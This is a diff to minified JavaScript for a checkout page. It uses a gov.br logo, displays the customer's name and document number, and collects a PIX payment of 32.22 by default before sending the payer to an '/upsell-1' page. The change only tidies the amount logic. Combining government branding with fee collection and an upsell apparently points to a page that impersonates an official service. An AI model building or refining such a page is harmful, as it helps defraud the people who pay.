@@ -71,8 +71,8 @@ const O = "/assets/govbr-logo-DUdxlXZj.png"
   [P,ae] = l.useState(!0),
   [pixAmount, setPixAmount] = l.useState(null),
   m = Number(d),
-  p = pixAmount ? pixAmount / 100 : 32.22,
-  B = pixAmount || 3222,
+  B = Number(pixAmount ?? 3222), // 🔥 GARANTE VALOR SEMPRE
+  p = B / 100,
   g = ((w = a == null ? void 0 : a.name) == null ? void 0 : w.split(" ")[0]) || "",
   j = se(a == null ? void 0 : a.document)
       , b = l.useMemo( () => {
@@ -81,7 +81,7 @@ const O = "/assets/govbr-logo-DUdxlXZj.png"
     }
     , [])
       , {loading: N, pixData: o, copied: v, pixTimer: y, pixRef: S, handlePay: z, handleCopy: L} = A({
-        amountInCents: B,
+        amountInCents: Number(B) || 3222,
         redirectTo: "/upsell-1",
         customerData: a,
         extraState: {
